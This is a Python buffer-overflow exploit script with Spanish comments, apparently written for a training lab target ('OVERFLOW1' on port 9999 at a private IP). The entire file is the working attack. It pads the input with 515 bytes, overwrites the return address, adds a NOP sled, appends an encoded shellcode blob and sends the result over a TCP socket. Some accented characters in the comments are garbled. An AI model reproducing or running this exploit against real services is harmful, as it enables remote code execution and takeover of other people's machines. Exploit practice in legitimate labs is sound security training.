import socket

# Par치metros de conexi칩n
ip = "192.168.1.134"
port = 9999

# Definir la estructura del buffer
def build_buffer():
    prefix = "OVERFLOW1"
    offset = 515
    overflow = "A" * offset
    retn = "\xf3\x12\x17\x31"
    padding = "\x90" * 16
    payload = (
"\xdd\xc7\xbf\x1a\x62\xe6\x81\xd9\x74\x24\xf4\x5d\x2b\xc9"
"\xb1\x52\x31\x7d\x17\x83\xc5\x04\x03\x67\x71\x04\x74\x6b"
"\x9d\x4a\x77\x93\x5e\x2b\xf1\x76\x6f\x6b\x65\xf3\xc0\x5b"
"\xed\x51\xed\x10\xa3\x41\x66\x54\x6c\x66\xcf\xd3\x4a\x49"
"\xd0\x48\xae\xc8\x52\x93\xe3\x2a\x6a\x5c\xf6\x2b\xab\x81"
"\xfb\x79\x64\xcd\xae\x6d\x01\x9b\x72\x06\x59\x0d\xf3\xfb"
"\x2a\x2c\xd2\xaa\x21\x77\xf4\x4d\xe5\x03\xbd\x55\xea\x2e"
"\x77\xee\xd8\xc5\x86\x26\x11\x25\x24\x07\x9d\xd4\x34\x40"
"\x1a\x07\x43\xb8\x58\xba\x54\x7f\x22\x60\xd0\x9b\x84\xe3"
"\x42\x47\x34\x27\x14\x0c\x3a\x8c\x52\x4a\x5f\x13\xb6\xe1"
"\x5b\x98\x39\x25\xea\xda\x1d\xe1\xb6\xb9\x3c\xb0\x12\x6f"
"\x40\xa2\xfc\xd0\xe4\xa9\x11\x04\x95\xf0\x7d\xe9\x94\x0a"
"\x7e\x65\xae\x79\x4c\x2a\x04\x15\xfc\xa3\x82\xe2\x03\x9e"
"\x73\x7c\xfa\x21\x84\x55\x39\x75\xd4\xcd\xe8\xf6\xbf\x0d"
"\x14\x23\x6f\x5d\xba\x9c\xd0\x0d\x7a\x4d\xb9\x47\x75\xb2"
"\xd9\x68\x5f\xdb\x70\x93\x08\x24\x2c\x9a\x46\xcc\x2f\x9c"
"\x57\xb6\xb9\x7a\x3d\xd8\xef\xd5\xaa\x41\xaa\xad\x4b\x8d"
"\x60\xc8\x4c\x05\x87\x2d\x02\xee\xe2\x3d\xf3\x1e\xb9\x1f"
"\x52\x20\x17\x37\x38\xb3\xfc\xc7\x37\xa8\xaa\x90\x10\x1e"
"\xa3\x74\x8d\x39\x1d\x6a\x4c\xdf\x66\x2e\x8b\x1c\x68\xaf"
"\x5e\x18\x4e\xbf\xa6\xa1\xca\xeb\x76\xf4\x84\x45\x31\xae"
"\x66\x3f\xeb\x1d\x21\xd7\x6a\x6e\xf2\xa1\x72\xbb\x84\x4d"
"\xc2\x12\xd1\x72\xeb\xf2\xd5\x0b\x11\x63\x19\xc6\x91\x83"
"\xf8\xc2\xef\x2b\xa5\x87\x4d\x36\x56\x72\x91\x4f\xd5\x76"
"\x6a\xb4\xc5\xf3\x6f\xf0\x41\xe8\x1d\x69\x24\x0e\xb1\x8a"
"\x6d"
)

    postfix = ""
    buffer = prefix + overflow + retn + padding + payload + postfix
    return buffer

def send_buffer(buffer):
    #Crear el socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # Conectar al servidor
        s.connect((ip,port))
        print("Conexi칩n establecida. Enviando buffer malicioso...")
        # Enviar el buffer
        s.send(bytes(buffer + "\r\n", "latin-1"))
        print("!Buffer enviado exitosamente!")
    except Exception as e:
        print ("Error al conectar:", e)
    finally:
        #Cerrar la conexi칩n
        s.close()

if __name__ == "__main__":
	# Construir el buffer
	buffer = build_buffer()
	# Enviar el buffer
	send_buffer(buffer)


